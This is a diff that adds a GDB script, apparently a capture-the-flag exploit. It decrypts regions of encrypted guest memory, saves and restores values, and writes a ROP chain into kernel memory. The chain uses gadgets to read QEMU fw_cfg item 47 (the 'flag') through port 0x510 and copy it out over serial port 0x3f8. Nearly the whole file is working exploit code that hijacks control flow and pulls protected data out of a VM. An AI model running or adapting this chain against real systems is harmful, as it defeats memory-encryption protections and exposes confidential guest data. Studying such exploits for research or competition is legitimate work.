@@ -1,0 +1,79 @@
+define dump
+call decrypt_block(encrypted_regions[0].encrypted_memory_region_mapping + 0x281f180, 0x281f180)
+call decrypt_block(encrypted_regions[0].encrypted_memory_region_mapping + 0x26fa9b0, 0x26fa9b0)
+call decrypt_block(encrypted_regions[0].encrypted_memory_region_mapping + 0x2708cb0, 0x2708cb0)
+p/x *(long *)(encrypted_regions[0].encrypted_memory_region_mapping + 0x281f180)
+p/x *(long *)(encrypted_regions[0].encrypted_memory_region_mapping + 0x281f188)
+p/x *(long *)(encrypted_regions[0].encrypted_memory_region_mapping + 0x26fa9b0)
+p/x *(long *)(encrypted_regions[0].encrypted_memory_region_mapping + 0x26fa9b8)
+p/x *(long *)(encrypted_regions[0].encrypted_memory_region_mapping + 0x2708cb0)
+p/x *(long *)(encrypted_regions[0].encrypted_memory_region_mapping + 0x2708cb8)
+call encrypt_block(encrypted_regions[0].encrypted_memory_region_mapping + 0x281f180, 0x281f180)
+call encrypt_block(encrypted_regions[0].encrypted_memory_region_mapping + 0x26fa9b0, 0x26fa9b0)
+call encrypt_block(encrypted_regions[0].encrypted_memory_region_mapping + 0x2708cb0, 0x2708cb0)
+end
+
+define save
+set $q0 = *(long *)(encrypted_regions[0].encrypted_memory_region_mapping + 0x281f180)
+set $q1 = *(long *)(encrypted_regions[0].encrypted_memory_region_mapping + 0x281f188)
+set $q2 = *(long *)(encrypted_regions[0].encrypted_memory_region_mapping + 0x26fa9b0)
+set $q3 = *(long *)(encrypted_regions[0].encrypted_memory_region_mapping + 0x26fa9b8)
+set $q4 = *(long *)(encrypted_regions[0].encrypted_memory_region_mapping + 0x2708cb0)
+set $q5 = *(long *)(encrypted_regions[0].encrypted_memory_region_mapping + 0x2708cb8)
+end
+
+define stq
+set *(long *)(encrypted_regions[0].encrypted_memory_region_mapping + $arg0) = $arg1
+end
+
+define restore
+stq 0x281f180 $q0
+stq 0x281f188 $q1
+stq 0x26fa9b0 $q2
+stq 0x26fa9b8 $q3
+stq 0x2708cb0 $q4
+stq 0x2708cb8 $q5
+end
+
+define stq_rop
+stq $cur_rop $arg0
+set $cur_rop = $cur_rop + 8
+end
+
+define rop
+
+# QemuFwCfgSelectItem(flag)
+# common_startup_64_ptr = pop rax ; ret
+stq 0x2ca1070 0x1de2dd4
+set $cur_rop = 0x2803f58
+# flag
+stq_rop 47
+# pop rdx ; ret
+stq_rop 0x1d70d82
+# FW_CFG_IO_BASE / comb_iomem = {fw_cfg_data_read, fw_cfg_comb_write}
+stq_rop 0x510
+# out dx, ax ; jmp 0xffffffff817bd0e0 -> ret
+stq_rop 0x207bd3e
+
+set $i = 0
+while $i < 100
+# inb(FW_CFG_IO_BASE)
+# pop rdx ; ret
+stq_rop 0x1d70d82
+# FW_CFG_IO_BASE
+stq_rop 0x510
+# in al, dx ; ret
+stq_rop 0x203fb60
+
+# outb(early_serial_base, al)
+# pop rdx ; ret
+stq_rop 0x1d70d82
+# early_serial_base
+stq_rop 0x3f8
+# out dx, al ; ret
+stq_rop 0x1d78a37
+
+set $i = $i + 1
+end
+
+end
